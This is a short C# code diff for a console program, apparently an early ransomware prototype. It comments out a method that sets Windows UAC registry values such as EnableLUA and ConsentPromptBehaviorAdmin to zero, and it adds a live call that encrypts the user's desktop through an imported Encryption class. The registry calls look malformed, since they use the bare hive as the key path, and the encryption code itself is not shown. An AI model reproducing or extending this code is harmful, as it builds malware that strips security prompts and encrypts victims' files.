@@ -4,6 +4,8 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using Microsoft.Win32;
+using EncryptionLogic;
+using System.Windows;
 
 namespace ConsoleApplication1
 {
@@ -11,10 +13,11 @@ namespace ConsoleApplication1
 	{
 		static void Main(string[] args)
 		{
-			setRegistry();
+			//setRegistry();
+			startEncryption();
 		}
 
-		private static void setRegistry()
+		/*private static void setRegistry()
 		{
 			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableUIADesktopToggle", 1);
 			Registry.SetValue("HKEY_LOCAL_MACHINE", "ConsentPromptBehaviorAdmin", 0);
@@ -22,11 +25,12 @@ namespace ConsoleApplication1
 			Registry.SetValue("HKEY_LOCAL_MACHINE", "ValidateAdminCodeSignatures", 0);
 			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableSecureUIAPaths", 0);
 			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableLUA", 0);
-		}
+		}*/
 
-		protected void startEncryption()
+		private static void startEncryption()
 		{
-			
+			Encryption encryption = new Encryption();
+			encryption.encryptDesktop();
 		}
 	}
 }
